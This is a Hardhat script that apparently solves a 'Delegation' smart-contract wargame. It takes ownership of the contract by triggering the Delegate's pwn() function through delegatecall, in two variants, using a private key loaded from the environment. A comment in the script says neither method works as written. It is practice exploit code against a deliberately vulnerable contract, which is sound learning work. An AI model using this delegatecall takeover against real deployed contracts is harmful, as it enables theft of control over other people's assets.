const { assert } = require("console");
const { ethers } = require("hardhat");
const hre = require("hardhat");
require("dotenv").config({ path: ".env" });

CONTRACT_NAME = "Delegation"

async function getContract(wallet) {
  const factory = await hre.ethers.getContractFactory(CONTRACT_NAME);
  let contract = null;
  if(hre.network.name == "hardhat") {
    const delegateFactory = await hre.ethers.getContractFactory("Delegate");
    delegate = await delegateFactory.deploy(delegateFactory.signer.address);
    await delegate.deployed();
    contract = await factory.deploy(delegate.address);
    await contract.deployed();
  }
  else {
    contract = factory.attach(process.env.CONTRACT_ADDRESS);
  }
  return contract.connect(wallet);
}

async function giveWalletMoney(hacker) {
  assert(hre.network.name == "hardhat");
  const [owner] = await ethers.getSigners();
  const trans = await owner.sendTransaction({
    to: hacker.address,
    value: ethers.utils.parseEther("0.1"),
  });
  await trans.wait()
}

async function main() {
  console.log("network name:", hre.network.name);
  const hacker = new ethers.Wallet(process.env.PRIVATE_KEY, hre.ethers.provider);
  contract = await getContract(hacker);
  if(hre.network.name == "hardhat") {
    console.log("getting some eth")
    giveWalletMoney(hacker);
  }

  console.log("hacking contract:", contract.address, await contract.owner());

  console.log("pwn that shit");

  // neither of these methods work without adding a log function to the smart contracts :(

  // method 1
  const abi = ["function pwn() public"]
  const proxiedContract = new ethers.Contract(contract.address, abi, hacker);
  await (await proxiedContract.pwn()).wait();

  // method 2
  const delegateFactory = await hre.ethers.getContractFactory("Delegate");
  const callData = delegateFactory.interface.encodeFunctionData("pwn", []);
  console.log(callData)
  
  await (await hacker.sendTransaction({
    to: contract.address,
    from: hacker.address,
    data: callData,
  })).wait();

  console.log("contract is now owned by:", await contract.owner());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});